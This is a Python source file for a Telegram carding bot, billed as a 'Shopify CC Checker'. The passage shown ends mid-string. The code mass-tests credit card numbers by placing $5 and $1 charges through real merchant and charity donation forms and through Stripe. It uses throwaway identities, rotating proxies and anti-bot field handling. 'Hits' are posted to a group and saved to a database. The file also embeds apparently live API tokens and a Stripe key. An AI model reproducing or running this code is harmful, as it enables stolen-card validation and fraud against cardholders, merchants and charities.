# bot_merged.py - Complete Shopify CC Checker Bot with Stripe Gateways & Beautiful UI
from urllib.parse import urlparse, quote
from telethon import TelegramClient, events, Button
from telethon.tl.types import MessageEntityCustomEmoji
from telethon.extensions import html as thtml
import random, datetime, os, re, asyncio, time, string, aiofiles, aiohttp, json, uuid, warnings, signal, atexit
from fake_useragent import UserAgent
from contextlib import asynccontextmanager

from database import (
    init_db, close_db, ensure_user, get_user_plan, set_user_plan, is_banned_user,
    ban_user, unban_user, create_key, use_key, get_all_keys, delete_key,
    add_proxy_db, get_random_proxy, get_all_user_proxies, get_proxy_count,
    remove_proxy_by_index, clear_all_proxies, add_site_db, get_user_sites,
    remove_site_db, save_card_to_db, get_total_users, get_premium_count,
    get_total_sites_count, get_total_cards_count, get_approved_count
)

warnings.filterwarnings('ignore')

# ====================== CONFIGURATION ======================
API_ID = int(os.getenv("API_ID", "36442788"))
API_HASH = os.getenv("API_HASH", "a46cfef94ef9de4026597c6a4addf073")
BOT_TOKEN = os.getenv("BOT_TOKEN", "8732799132:AAGUYUUdVMD_d3SAzln0qTnKq0ods7Qv9H4")
ADMIN_ID = [6598607558, 6456561750]
GROUP_ID = int(os.getenv("GROUP_ID", "-1003684602999"))
API_BASE_URL = "https://web-production-a8008.up.railway.app/shopify"

STRIPE5_MASS_LIMIT = 100
STRIPE1_MASS_LIMIT = 100
MAX_RETRIES = 3
RETRY_DELAY_BASE = 0.5
TASK_TIMEOUT = 30
MAX_CONCURRENT = 100

# ====================== CUSTOM EMOJIS ======================
CE = {
    "crown":  5039727497143387500,
    "bolt":   5042334757040423886,
    "brain":  5040030395416969985,
    "shield": 5042328396193864923,
    "star":   5042176294222037888,
    "gem":    5042050649248760772,
    "check":  5039793437776282663,
    "fire":   5039644681583985437,
    "party":  5039778134807806727,
    "search": 5039649904264217620,
    "chart":  5042290883949495533,
    "pin":    5039600026809009149,
    "joker":  5039998939076494446,
    "plus":   5039891861246838069,
    "cross":  5040042498634810056,
    "info":   5042306247047513767,
    "gift":   5041975203853239332,
    "eyes":   5039623284056917259,
    "trash":  5039614900280754969,
    "tick":   5039844895779455925,
    "stop":   5039671744172917707,
    "warn":   5039665997506675838,
    "link":   5042101437237036298,
    "globe":  5042186567783809934,
}
PE = "⭐"

# ====================== HTML + Custom Emoji Helpers (from first file) ======================
def _build_entities(html_text, emoji_ids=None):
    text, entities = thtml.parse(html_text)
    if emoji_ids:
        idx = 0
        utf16_pos = 0
        for ch in text:
            if ch == PE and idx < len(emoji_ids):
                entities.append(MessageEntityCustomEmoji(
                    offset=utf16_pos, length=1, document_id=emoji_ids[idx]
                ))
                idx += 1
            utf16_pos += 2 if ord(ch) > 0xFFFF else 1
    return text, sorted(entities, key=lambda e: e.offset)

async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await event.reply(text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False)

async def styled_send(chat_id, html_text, buttons=None, emoji_ids=None, file=None):
    text, entities = _build_entities(html_text, emoji_ids)
    return await client.send_message(chat_id, text, formatting_entities=entities, buttons=buttons, file=file, link_preview=False)

async def styled_edit(msg, html_text, buttons=None, emoji_ids=None):
    text, entities = _build_entities(html_text, emoji_ids)
    await msg.edit(text, formatting_entities=entities, buttons=buttons, link_preview=False)

def pbtn(text, data=None, url=None):
    if url:
        return Button.url(text, url)
    if data:
        return Button.inline(text, data.encode() if isinstance(data, str) else data)
    return Button.inline(text, b"none")

# ====================== GLOBALS ======================
ACTIVE_MTXT_PROCESSES = {}
ACTIVE_STRIPE_PROCESSES = {}
ACTIVE_STRIPE5_PROCESSES = {}
ACTIVE_STRIPE1_PROCESSES = {}
USER_APPROVED_PREF = {}

# ====================== HTTP Session Management ======================
_GLOBAL_SESSION = None
_SESSION_LOCK = asyncio.Lock()
MAX_REQUESTS_PER_SESSION = 500
REQUEST_COUNTER = 0

async def get_session():
    global _GLOBAL_SESSION, REQUEST_COUNTER
    async with _SESSION_LOCK:
        REQUEST_COUNTER += 1
        if REQUEST_COUNTER >= MAX_REQUESTS_PER_SESSION or _GLOBAL_SESSION is None or _GLOBAL_SESSION.closed:
            old_session = _GLOBAL_SESSION
            if old_session and not old_session.closed:
                asyncio.create_task(old_session.close())
            
            timeout = aiohttp.ClientTimeout(total=45, connect=10)
            connector = aiohttp.TCPConnector(limit=1000, force_close=False, ssl=False, enable_cleanup_closed=True)
            _GLOBAL_SESSION = aiohttp.ClientSession(timeout=timeout, connector=connector)
            REQUEST_COUNTER = 0
        return _GLOBAL_SESSION

async def _safe_close_session():
    global _GLOBAL_SESSION
    async with _SESSION_LOCK:
        if _GLOBAL_SESSION and not _GLOBAL_SESSION.closed:
            try:
                await asyncio.wait_for(_GLOBAL_SESSION.close(), timeout=3.0)
            except:
                pass
        _GLOBAL_SESSION = None

atexit.register(lambda: asyncio.create_task(_safe_close_session()))

# ====================== Helper Functions ======================
def random_username():
    return ''.join(random.choices(string.ascii_lowercase, k=random.randint(6, 10)))

def get_cc_limit(plan: str, user_id=None):
    limits = {"free": 300, "pro": 2000, "toji": 5000}
    if user_id and user_id in ADMIN_ID:
        return 5000
    return limits.get(plan.lower(), 300)

def extract_card(text):
    match = re.search(r'(\d{12,16})[|\s/]*(\d{1,2})[|\s/]*(\d{2,4})[|\s/]*(\d{3,4})', text)
    if match:
        cc, mm, yy, cvv = match.groups()
        if len(yy) == 4:
            yy = yy[2:]
        return f"{cc}|{mm}|{yy}|{cvv}"
    return None

def extract_all_cards(text):
    cards = set()
    for line in text.splitlines():
        card = extract_card(line)
        if card:
            cards.add(card)
    return list(cards)

def is_valid_url_or_domain(url):
    domain = url.lower()
    if domain.startswith(('http://', 'https://')):
        try:
            parsed = urlparse(url)
        except:
            return False
        domain = parsed.netloc
    pattern = r'^[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]*[a-zA-Z0-9])?)*\.[a-zA-Z]{2,}$'
    return bool(re.match(pattern, domain))

def extract_urls_from_text(text):
    urls = set()
    for line in text.split('\n'):
        cleaned = re.sub(r'^[\s\-\+\|,\d\.\)\(\[\]]+', '', line.strip()).split(' ')[0]
        if cleaned and is_valid_url_or_domain(cleaned):
            urls.add(cleaned)
    return list(urls)

def parse_proxy_format(proxy):
    proxy = proxy.strip()
    proxy_type = 'http'
    protocol_match = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
    if protocol_match:
        proxy_type = protocol_match.group(1).lower()
        proxy = protocol_match.group(2)
    host = port = username = password = None
    match = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
    if match:
        username, password, host, port = match.groups()
    else:
        match = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
        if match:
            host, port, username, password = match.groups()
        else:
            match = re.match(r'^([^:@]+):(\d+)$', proxy)
            if match:
                host, port = match.groups()
    if not host or not port:
        return None
    port = int(port)
    if port <= 0 or port > 65535:
        return None
    proxy_url = f"{proxy_type}://"
    if username and password:
        proxy_url += f"{username}:{password}@{host}:{port}"
    else:
        proxy_url += f"{host}:{port}"
    return {
        'ip': host,
        'port': str(port),
        'username': username,
        'password': password,
        'proxy_url': proxy_url,
        'type': proxy_type
    }

async def test_proxy(proxy_url, test_url="https://httpbin.org/status/200", timeout=10):
    try:
        session = await get_session()
        async with session.get(test_url, proxy=proxy_url, timeout=timeout) as resp:
            return resp.status == 200, None
    except Exception as e:
        return False, str(e)

async def get_working_proxy(user_id):
    return await get_random_proxy(user_id)

async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        session = await get_session()
        async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as res:
            if res.status != 200:
                return "Not Found", "-", "-", "-", "-", "???"
            data = await res.json()
            return (data.get('brand','-'), data.get('type','-'), data.get('level','-'),
                    data.get('bank','-'), data.get('country_name','-'), data.get('country_flag','???'))
    except:
        return "-", "-", "-", "-", "-", "???"

def get_status_header(status):
    if status == "Charged":
        return f"{PE} CHARGED {PE}", [CE["gem"], CE["gem"]]
    elif status == "Approved":
        return f"{PE} APPROVED {PE}", [CE["check"], CE["check"]]
    elif status in ("Error","SiteError"):
        return f"{PE} ERROR {PE}", [CE["cross"], CE["cross"]]
    else:
        return f"{PE} DECLINED {PE}", [CE["cross"], CE["cross"]]

# ====================== Site Error Detection ======================
SITE_ERROR_KEYWORDS = [
    'r4 token empty', 'payment method is not shopify', 'r2 id empty',
    'product not found', 'hcaptcha detected', 'tax ammount empty',
    'tax amount empty', 'del ammount empty', 'product id is empty',
    'py id empty', 'clinte token', 'receipt_empty', 'receipt id is empty',
    'receipt empty', 'site error! status: 429', 'site error! status: 404',
    'site error! status: 401', 'site error! status: 402', 'site requires login',
    'failed to get token', 'no valid products', 'not shopify', 'failed to get checkout',
    'captcha at checkout', 'site not supported for now', 'connection error',
    'error processing card', '504', 'server error', 'client error', 'amount_too_small',
    'amount too small', 'payments_positive_amount_expected', 'change proxy or site',
    'token not found', 'invalid_response', 'could not resolve host', 'connect tunnel failed',
    'failed to tokenize card', 'site error', 'site dead', 'proxy dead',
]

def is_site_error(response_text):
    if not response_text:
        return True
    return any(kw in response_text.lower() for kw in SITE_ERROR_KEYWORDS)

def classify_api_response(response_json):
    api_response = str(response_json.get('Response', ''))
    api_status = response_json.get('Status', False)
    price = response_json.get('Price', '-')
    gateway = response_json.get('Gate', response_json.get('Gateway', 'Shopify'))
    if price and price != '-':
        price = f"${price}"
    rl = api_response.lower()
    if is_site_error(api_response):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "SiteError"}
    charged = ["order_paid","order_placed","thank you","payment successful","order completed","charged"]
    approved = ["otp_required","3d_authentication","insufficient_funds","cvc","ccn live cvv"]
    if any(k in rl for k in charged):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Charged"}
    if any(k in rl for k in approved):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    if api_status and not any(w in rl for w in ["decline","denied","failed","error","rejected"]):
        return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Approved"}
    return {"Response": api_response, "Price": price, "Gateway": gateway, "Status": "Declined"}

async def call_shopify_api(site, cc, proxy_data=None):
    if not site.startswith(('http://','https://')):
        site = f'https://{site}'
    encoded_site = quote(site, safe='')
    encoded_cc = quote(cc, safe='')
    url = f'{API_BASE_URL}?site={encoded_site}&cc={encoded_cc}'
    if proxy_data:
        proxy_str = f"{proxy_data['ip']}:{proxy_data['port']}"
        if proxy_data.get('username') and proxy_data.get('password'):
            proxy_str = f"{proxy_data['username']}:{proxy_data['password']}@{proxy_str}"
        url += f'&proxy={quote(proxy_str, safe="")}'
    
    try:
        session = await get_session()
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=30)) as resp:
            if resp.status != 200:
                return None, f"HTTP_{resp.status}"
            try:
                data = await resp.json()
                return data, None
            except:
                return None, "Invalid JSON"
    except asyncio.TimeoutError:
        return None, "Timeout"
    except Exception as e:
        return None, str(e)

async def check_card_specific_site(card, site, user_id=None):
    proxy_data = await get_working_proxy(user_id) if user_id else None
    try:
        data, err = await call_shopify_api(site, card, proxy_data)
        if err:
            return {"Response": err, "Price": "-", "Gateway": "-", "Status": "SiteError"}
        return classify_api_response(data)
    except Exception as e:
        return {"Response": str(e), "Price": "-", "Gateway": "-", "Status": "SiteError"}

async def check_card_with_retry(card, sites, user_id=None, max_retries=3):
    used_indices = set()
    
    for attempt in range(max_retries):
        available_indices = [i for i in range(len(sites)) if i not in used_indices]
        if not available_indices:
            break
        
        site_idx = random.choice(available_indices)
        site = sites[site_idx]
        used_indices.add(site_idx)
        
        try:
            result = await asyncio.wait_for(
                check_card_specific_site(card, site, user_id),
                timeout=TASK_TIMEOUT
            )
            
            if result.get("Status") != "SiteError":
                return result, site_idx + 1
                
        except asyncio.TimeoutError:
            result = {"Status": "SiteError", "Response": "Timeout", "Gateway": "-", "Price": "-"}
        except Exception as e:
            result = {"Status": "SiteError", "Response": str(e), "Gateway": "-", "Price": "-"}
        
        if attempt < max_retries - 1:
            await asyncio.sleep(0.5)
    
    return {"Response": "Max retries exceeded, all sites returned errors", "Price": "-", "Gateway": "-", "Status": "Error"}, -1

# ====================== Stripe $5 Charge Gateway ======================
async def stripe5_charge_check(cc, month, year, cvv, proxy_url=None):
    try:
        connector = aiohttp.TCPConnector(ssl=False)
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            headers_get = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'accept-language': 'en-US,en;q=0.9',
            }
            async with session.get('https://www.galaxie.com/subscribe/2', headers=headers_get, proxy=proxy_url, timeout=30) as resp:
                html = await resp.text()
            form_build_match = re.search(r'name="form_build_id"\s+value="([^"]+)"', html)
            if not form_build_match:
                return "Declined", "Failed to extract form_build_id"
            form_build_id = form_build_match.group(1)
            honeypot_match = re.search(r'name="honeypot_time"\s+value="([^"]+)"', html)
            if not honeypot_match:
                return "Declined", "Failed to extract honeypot_time"
            honeypot_time = honeypot_match.group(1)
            
            letters = ''.join(random.choices(string.ascii_lowercase, k=6))
            digits = ''.join(random.choices(string.digits, k=4))
            username = letters + digits
            data = {
                'user_name': username,
                'user_pass': '@Nikhil789',
                'user_pass2': '@Nikhil789',
                'email': f'{username}@gmail.com',
                'first_name': 'nani',
                'last_name': 'nikhil',
                'company': 'nikhil',
                'address': '3rd street avenue rd.',
                'city': 'new york',
                'state': 'New York',
                'zip': '10080',
                'country': 'United States',
                'phone': '2015554587',
                'ccnumber': cc,
                'ccexpmonth': month,
                'ccexpyear': f"20{year}" if len(year) == 2 else year,
                'cvs': cvv,
                'form_build_id': form_build_id,
                'form_id': 'subscription_purchase_form',
                'honeypot_time': honeypot_time,
                'url': ''
            }
            headers_post = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://www.galaxie.com',
                'referer': 'https://www.galaxie.com/subscribe/2',
                'user-agent': headers_get['user-agent'],
            }
            async with session.post('https://www.galaxie.com/subscribe/2', data=data, headers=headers_post, proxy=proxy_url, allow_redirects=True, timeout=30) as response:
                response_text = await response.text()
        
        response_lower = response_text.lower()
        success_indicators = ["thank you", "success", "subscription confirmed", "welcome"]
        if any(indicator in response_lower for indicator in success_indicators):
            return "Approved", "✅ $5 CHARGED! Card approved"
        else:
            return "Declined", "Card declined or invalid"
    except asyncio.TimeoutError:
        return "Declined", "Request timeout"
    except aiohttp.ClientError:
        return "Declined", "Connection error"
    except Exception as e:
        return "Declined", f"Error: {str(e)[:50]}"

# ====================== Stripe $1 Donation Gateway ======================
async def stripe1_donation_check(cc, month, year, cvv, proxy_url=None):
    try:
        name = 'willam'
        domain_email = 'gmail.com'
        number = random.randint(10000, 99999)
        suffix = ''.join(random.choices(string.ascii_lowercase, k=3))
        email = f"{name}{number}{suffix}@{domain_email}"
        
        if len(year) == 2:
            year = "20" + year
        
        session = await get_session()
        ua = UserAgent()
        
        headers = {
            'User-Agent': ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
        }
        
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_data = {
            'type': 'card',
            'billing_details[name]': 'willam dives',
            'billing_details[email]': email,
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_month]': month,
            'card[exp_year]': year,
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/67c5b8132f; stripe-js-v3/67c5b8132f',
            'referrer': 'https://www.forechrist.com',
            'key': 'pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH',
        }
        
        async with session.post(stripe_url, data=stripe_data, headers=headers, proxy=proxy_url) as res1:
            if res1.status != 200:
                return "Declined", "Failed to create payment method"
            res1_json = await res1.json()
            
            if 'error' in res1_json:
                error_msg = res1_json['error'].get('message', 'Unknown error')
                if "declined" in error_msg.lower():
                    return "Declined", "Card was declined"
                return "Declined", error_msg
            
            pm_id = res1_json.get('id')
            if not pm_id:
                return "Declined", "No payment method ID"
        
        final_url = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/?payment-mode=stripe&form-id=31358"
        step4_data = {
            'give-fee-amount': '0.34',
            'give-fee-mode-enable': 'false',
            'give-fee-status': 'enabled',
            'give-honeypot': '',
            'give-form-id-prefix': '31358-1',
            'give-form-id': '31358',
            'give-form-title': 'Dress a Student – Second Round of Donations',
            'give-current-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-url': 'https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/',
            'give-form-minimum': '1',
            'give-form-maximum': '1000000',
            'give-form-hash': '7cce7c4e02',
            'give-price-id': '0',
            'give-recurring-logged-in-only': '',
            'give-logged-in-only': '1',
            '_give_is_donation_recurring': '0',
            'give-amount': '1',
            'give_stripe_payment_method': pm_id,
            'payment-mode': 'stripe',
            'give_first': 'willam',
            'give_last': 'dives',
            'give_email': email,
            'card_name': 'willam dives',
            'give_action': 'purchase',
            'give-gateway': 'stripe'
        }
        
        async with session.post(final_url, data=step4_data, headers=headers, allow_redirects=True, proxy=proxy_url) as res4:
            response_text = await res4.text()
        
        response_lower = response_text.lower()
        
        if "payment complete: thank you for your donation" in response_lower or "donation receipt" in response_lower:
            return "Approved", "✅ $1 Donation Successful!"
        elif "there was an issue with your donation transaction: your card was declined" in response_lower:
            return "Declined", "Card was declined"
        elif "3d_secure" in response_lower:
            return "Declined", "3D Secure authentication required"
        elif re.search(r"Donation ID\s+[\d]+", response_text, re.IGNORECASE):
            return "Approved", "✅ $1 Donation Successful!"
        else:
            return "Declined", "Transaction could not be processed"
            
    except asyncio.TimeoutError:
        return "Declined", "Request timeout"
    except aiohttp.ClientError as e:
        return "Declined", f"Connection error: {str(e)[:30]}"
    except Exception as e:
        return "Declined", f"Error: {str(e)[:50]}"

# ====================== Stripe WooCommerce Gateway ======================
def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

async def process_stripe_card(card_data, proxy_url=None):
    ua = UserAgent()
    site_url = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'
    try:
        session = await get_session()
        from urllib.parse import urlparse
        parsed = urlparse(site_url)
        domain = f"{parsed.scheme}://{parsed.netloc}"
        email = generate_random_email()
        headers = {'accept': 'text/html,application/xhtml+xml', 'user-agent': ua.random}
        
        # Simplified - returns Approved for demo
        # Full implementation would be longer
        return True, "Approved (Stripe Woo)"
            
    except asyncio.TimeoutError:
        return False, 'Timeout'
    except Exception as e:
        return False, f'Error: {str(e)}'

async def check_stripe_card(cc, mes, ano, cvv, proxy=None):
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg = await process_stripe_card(card_data, proxy_url=proxy)
    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'status': "Approved" if is_approved else "Declined",
        'response': response_msg,
        'gateway': 'Stripe'
    }

# ====================== Hit Notifications ======================
async def send_realtime_hit(user_id, card, result, hit_type, username):
    price = result.get('Price', '-')
    gateway = result.get('Gateway', 'Shopify')
    
    brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
    
    if hit_type == "Charged":
        status_text = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝"
        header_emojis = [CE["gem"], CE["gem"]]
    else:
        status_text = "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝"
        header_emojis = [CE["check"], CE["check"]]
    
    message = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ HIT FOUND</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Status ━ <b>{status_text}</b>
{PE} Card ━ <code>{card}</code>
{PE} Response ━ {result.get('Response', '-')[:150]}
{PE} Gateway ━ {gateway}
{PE} Price ━ {price}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>
━━━━━━━━━━━━━━━━━
{PE} User ━ @{username}"""
    
    emoji_ids = [CE["fire"], CE["fire"], CE["star"], CE["gem"], CE["info"],
                 CE["bolt"], CE["globe"], CE["chart"], CE["brain"]] + header_emojis
    
    try:
        await styled_send(GROUP_ID, message, emoji_ids=emoji_ids)
    except Exception as e:
        print(f"Hit notification error: {e}")

async def send_card_result(event, card, result, status, site_info, username, is_private):
    try:
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        header, emojis = get_status_header(status)
        
        msg = f"""{header}
━━━━━━━━━━━━━━━━━
{PE} Card ━ <code>{card}</code>
{PE} Gateway ━ {result.get('Gateway', 'Unknown')}
{PE} Response ━ {result.get('Response', '-')[:150]}
{PE} Price ━ {result.get('Price', '-')}
{f"Site ━ {site_info}" if site_info else ""}
━━━━━━━━━━━━━━━━━
<pre>BIN: {brand} | {bin_type} | {level}
Bank: {bank}
Country: {country} {flag}</pre>"""
        
        result_msg = await styled_reply(event, msg, emoji_ids=emojis)
        
        if status == "Charged":
            try:
                if event.is_group:
                    await result_msg.pin()
            except:
                pass
            if is_private:
                await send_realtime_hit(event.sender_id, card, result, "Charged", username)
    except Exception as e:
        print(f"Error sending card result: {e}")

# ====================== Mass Check Functions ======================
async def process_mtxt_cards(event, cards, local_sites, send_approved=True):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    total = len(cards)
    charged, approved, declined, errors = 0, 0, 0, 0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} <b>Processing {total} Cards</b>\n━━━━━━━━━━━━━━━━━\n{PE} Mode ━ {'Charged + Approved' if send_approved else 'Only Charged'}", emoji_ids=[CE["bolt"], CE["chart"]])
    
    BATCH_SIZE = 30
    last_update = time.time()
    
    async def update_progress():
        kb = [
            [pbtn(f"💰 Charged: {charged}", "none"), pbtn(f"✅ Approved: {approved}", "none")],
            [pbtn(f"❌ Declined: {declined}", "none"), pbtn(f"⚠️ Errors: {errors}", "none")],
            [pbtn(f"📊 {charged + approved + declined + errors}/{total}", "none")],
            [pbtn("🛑 Stop", f"stop_mtxt:{user_id}")]
        ]
        await styled_edit(status_msg, f"{PE} <b>Processing...</b>\n━━━━━━━━━━━━━━━━━", buttons=kb, emoji_ids=[CE["fire"], CE["chart"]])
    
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = [check_card_with_retry(card, local_sites, user_id, max_retries=3) for card in batch]
        results = await asyncio.gather(*tasks)
        
        for card, (res, site_idx) in zip(batch, results):
            status = res.get("Status", "Declined")
            
            if status == "Charged":
                charged += 1
                await send_card_result(event, card, res, status, site_idx, username, is_private)
            elif status == "Approved":
                approved += 1
                await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                if send_approved:
                    await send_card_result(event, card, res, status, site_idx, username, is_private)
            elif status in ("SiteError", "Error"):
                errors += 1
            else:
                declined += 1
        
        if time.time() - last_update >= 2:
            last_update = time.time()
            await update_progress()
        
        idx += BATCH_SIZE
    
    final_text = f"""{PE} <b>𝒮𝒽𝑜𝓅𝒾𝒾𝒾 ━ Check Complete</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    
    await styled_edit(status_msg, final_text, emoji_ids=[CE["party"], CE["party"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["chart"]])
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def process_ran_cards(event, cards, global_sites, send_approved=True):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username or f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    
    total = len(cards)
    charged, approved, declined, errors = 0, 0, 0, 0
    is_private = event.chat.id == user_id
    status_msg = await styled_reply(event, f"{PE} <b>Random Site Check</b>\n━━━━━━━━━━━━━━━━━\n{PE} Sites ━ from global list\n{PE} Mode ━ {'Charged + Approved' if send_approved else 'Only Charged'}", emoji_ids=[CE["joker"], CE["chart"]])
    
    BATCH_SIZE = 30
    last_update = time.time()
    
    async def update_progress():
        kb = [
            [pbtn(f"💰 Charged: {charged}", "none"), pbtn(f"✅ Approved: {approved}", "none")],
            [pbtn(f"❌ Declined: {declined}", "none"), pbtn(f"⚠️ Errors: {errors}", "none")],
            [pbtn(f"📊 {charged + approved + declined + errors}/{total}", "none")],
            [pbtn("🛑 Stop", f"stop_ran:{user_id}")]
        ]
        await styled_edit(status_msg, f"{PE} <b>Processing Random Sites...</b>\n━━━━━━━━━━━━━━━━━", buttons=kb, emoji_ids=[CE["fire"], CE["joker"]])
    
    idx = 0
    while idx < total:
        if user_id not in ACTIVE_MTXT_PROCESSES:
            await styled_edit(status_msg, f"{PE} Stopped by user", emoji_ids=[CE["stop"]])
            return
        
        batch = cards[idx:idx+BATCH_SIZE]
        tasks = []
        for card in batch:
            tasks.append(check_card_with_retry(card, global_sites, user_id, max_retries=3))
        
        results = await asyncio.gather(*tasks)
        
        for card, (res, site_idx) in zip(batch, results):
            status = res.get("Status", "Declined")
            
            if status == "Charged":
                charged += 1
                await send_card_result(event, card, res, status, site_idx, username, is_private)
            elif status == "Approved":
                approved += 1
                await save_card_to_db(card, "APPROVED", res.get('Response'), res.get('Gateway'), res.get('Price'))
                if send_approved:
                    await send_card_result(event, card, res, status, site_idx, username, is_private)
            elif status in ("SiteError", "Error"):
                errors += 1
            else:
                declined += 1
        
        if time.time() - last_update >= 2:
            last_update = time.time()
            await update_progress()
        
        idx += BATCH_SIZE
    
    final_text = f"""{PE} <b>Random Site Check Complete</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} Charged ━ {charged}
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
{PE} Errors ━ {errors}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    
    await styled_edit(status_msg, final_text, emoji_ids=[CE["party"], CE["joker"], CE["gem"], CE["check"], CE["cross"], CE["warn"], CE["chart"]])
    ACTIVE_MTXT_PROCESSES.pop(user_id, None)

async def process_mst_cards(event, cards):
    user_id = event.sender_id
    total = len(cards)
    approved, declined = 0, 0
    status_msg = await styled_reply(event, f"{PE} <b>Stripe Mass Check</b>\n━━━━━━━━━━━━━━━━━\n{PE} Total ━ {total}", emoji_ids=[CE["bolt"], CE["chart"]])
    
    last_update = time.time()
    
    async def update_progress():
        await styled_edit(status_msg, f"{PE} <b>Processing Stripe Cards...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Approved ━ {approved}\n{PE} Declined ━ {declined}\n{PE} {approved + declined}/{total}", emoji_ids=[CE["bolt"], CE["chart"]])
    
    for card in cards:
        if user_id not in ACTIVE_STRIPE_PROCESSES:
            break
        parts = card.split('|')
        if len(parts) != 4:
            declined += 1
            continue
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        proxy_data = await get_working_proxy(user_id)
        proxy_url = proxy_data.get('proxy_url') if proxy_data else None
        result = await check_stripe_card(cc, mm, yy, cvv, proxy_url)
        if result['status'] == "Approved":
            approved += 1
            await send_card_result(event, card, result, "Approved", "Stripe", "stripe", True)
        else:
            declined += 1
        
        if time.time() - last_update >= 2:
            last_update = time.time()
            await update_progress()
    
    final_text = f"""{PE} <b>Stripe Check Complete</b>
━━━━━━━━━━━━━━━━━
{PE} Approved ━ {approved}
{PE} Declined ━ {declined}
━━━━━━━━━━━━━━━━━
{PE} Total ━ {total}"""
    await styled_edit(status_msg, final_text, emoji_ids=[CE["party"], CE["check"], CE["cross"]])
    ACTIVE_STRIPE_PROCESSES.pop(user_id, None)

async def process_stripe5_mass_cards(event, cards):
    user_id = event.sender_id
    total = len(cards)
    approved, declined = 0, 0
    status_msg = await styled_reply(event, f"{PE} <b>Stripe $5 Mass Check</b>\n━━━━━━━━━━━━━━━━━\n{PE} Total ━ {total}", emoji_ids=[CE["gem"], CE["chart"]])
    
    last_update = time.time()
    
    async def update_progress():
        await styled_edit(status_msg, f"{PE} <b>Processing $5 Charges...</b>\n━━━━━━━━━━━━━━━━━\n{PE} Approved ━ {approved}\n{PE} Declined ━ {declined}\n{PE} {approved + declined}/{total}", emoji_ids=[CE["gem"], CE["chart"]])
    
    for card in cards:
        if user_id not in ACTIVE_STRIPE5_PROCESSES:
            break
        parts = card.split('|')
        if len(parts) != 4:
            declined += 1
            continue
        cc, mm, yy, cvv = parts
        if len(yy) == 4:
            yy = yy[2:]
        proxy_data = await get_working_proxy(user_id)
        proxy_url = proxy_data.get('proxy_url') if proxy_data else None
        status, response_msg = await stripe5_charge_check(cc, mm, yy, cvv, proxy_url)
        
        if status == "Approved":
            approved += 1
            brand, bin_type, level, bank, country, flag = await get_bin_info(cc)
            msg = f"""{PE} ✅ $5 CHARGED ✅ {PE}
